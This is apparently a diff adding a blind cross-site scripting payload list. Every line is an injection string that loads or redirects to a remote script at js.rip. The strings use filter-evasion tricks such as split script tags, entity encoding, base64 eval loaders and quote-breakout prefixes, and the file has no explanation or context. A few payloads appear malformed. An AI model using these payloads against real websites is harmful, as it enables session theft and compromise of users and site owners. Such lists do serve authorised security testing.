@@ -1,0 +1,66 @@
+<script src="https://js.rip/xsstesting"></script>
+<script/src=//"https://js.rip/xsstesting"></script>
+<scr<!-- -->ipt src="https://js.rip/xsstesting"></scr<!-- -->ipt>
+<s&#99ript src="https://js.rip/xsstesting"></script>
+'"script src=https://js.rip/xsstesting"script
+<img src="javascript:fetch('https://js.rip/xsstesting')">
+<a href="javascript:fetch('https://js.rip/xsstesting')">Click me</a>
+<object data="https://js.rip/xsstesting"></object>
+<input ng-focus="$event.view['location']='https://js.rip/xsstesting'">
+>%22%27><img%20src%3dhttps://js.rip/xsstesting>
+</script><base%20c%3D=href%3Dhttps://js.rip/xsstesting>
+<meta http-equiv="refresh" content="0;url=https://js.rip/xsstesting">
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:https://js.rip/xsstesting"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/xsstesting\';document.body.appendChild(a)')
+<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+<img src=f id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+<video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/mf4cjebo69&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/xsstesting");a.send();</script>
+<script>$.getScript("https://js.rip/xsstesting")</script>
+</script/x>$.getScript("https://js.rip/xsstesting")<//script/x>
+<a href="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/xsstesting\';document.body.appendChild(a)')">Link</a
+<svg o<script>nload=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+<p><img src="https://js.rip/xsstesting</p>
+<meta charset=iso-2022-jp><svg o[0x1B](Bnload=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+<link rel=import href="<script src="https://js.rip/xsstesting"></script>">
+%3Cx~%0Aonfocus=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20tabindex=0%3E#a
+<img src=https://js.rip/xsstesting >
+<svg onload=eval(atob('https://js.rip/xsstesting'))>
+<iframe srcdoc='&lt;script&gt;eval(atob("Y29uc29sZS5sb2coJzxzY3JpcHQgc3JjPSJodHRwczovL2pzLnJpcC9tZjRjamVibzY5Ij48L3NjcmlwdD4nKQ=="));&lt;/script&gt;'>
+<input type="image" src="https://js.rip/xsstesting" >
+<object data="data:text/html;base64,PPHNjcmlwdD5ldmFsKGF0b2IoJ2h0dHBzOi8vanMucmlwL21mNGNqZWJvNjknKSk8L3NjcmlwdD4="></object>
+<script src="data:text/javascript;base64,Y29uc29sZS5sb2coJzxzY3JpcHQgc3JjPSJodHRwczovL2pzLnJpcC9tZjRjamVibzY5Ij48L3NjcmlwdD4nKQ=="></script>
+<a href="javascript:void(0)" onmouseover="eval(atob('c3VwZXJjb250ZW50LmxvZygnPHNjcmlwdCBzcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiPjwvc2NyaXB0PicpOw='))">Click Me</a>
+<svg><style>{font-family&colon;'<iframe/onload=eval(atob("Y29uc29sZS5sb2coJzxzY3JpcHQgc3JjPSJodHRwczovL2pzLnJpcC9tZjRjamVibzY5Ij48L3NjcmlwdD4nKQ=="))>'}</style>
+<object type="text/x-scriptlet" data="https://js.rip/xsstesting"></object>
+<Iframe SrcDoc="<Script Src=https://js.rip/xsstesting></Script>">
+<script>window.location.href="https://js.rip/xsstesting";</script>
+<scr ipt>window.location.href="https://js.rip/xsstesting";</scr ipt>
+"><script>window.location.href="https://js.rip/xsstesting";</script>
+"><script>window.location.href="https://js.rip/xsstesting";</script><"
+'><script>window.location.href="https://js.rip/xsstesting";</script>
+'><script>window.location.href="https://js.rip/xsstesting";</script><'
+<scri<script>pt>window.location.href="https://js.rip/xsstesting";</scr</script>ipt>
+<scri<scr<script>ipt>pt>window.location.href="https://js.rip/xsstesting";</scr</sc</script>ript>ipt>
+";window.location.href="https://js.rip/xsstesting";"
+';window.location.href="https://js.rip/xsstesting";'
+;window.location.href="https://js.rip/xsstesting";
+window.location.href="https://js.rip/xsstesting";
+<SCR%00IPT>window.location.href="https://js.rip/xsstesting";</SCR%00IPT>
+\";window.location.href="https://js.rip/xsstesting";//
+<STYLE TYPE="text/javascript">window.location.href="https://js.rip/xsstesting";</STYLE>
+<<SCRIPT>window.location.href="https://js.rip/xsstesting";//<</SCRIPT>
+"{EVENTHANDLER}=window.location.href="https://js.rip/xsstesting"
+<img src="1" onerror="window.location.href='https://js.rip/xsstesting'">
+<img src='1' onerror='window.location.href="https://js.rip/xsstesting"' >
+onerror="window.location.href='https://js.rip/xsstesting'"
+onerror='window.location.href="https://js.rip/xsstesting"'
+onload="window.location.href='https://js.rip/xsstesting'"
+onload='window.location.href="https://js.rip/xsstesting"'
+<IMG """><SCRIPT>window.location.href="https://js.rip/xsstesting";</SCRIPT>">
+<IMG '''><SCRIPT>window.location.href="https://js.rip/xsstesting";</SCRIPT>'>
+"""><SCRIPT>window.location.href="https://js.rip/xsstesting"
+'''><SCRIPT>window.location.href="https://js.rip/xsstesting"'
+<IFRAME SRC='f' onerror="window.location.href='https://js.rip/xsstesting'"></IFRAME>
+<IFRAME SRC='f' onerror='window.location.href="https://js.rip/xsstesting"' ></IFRAME>
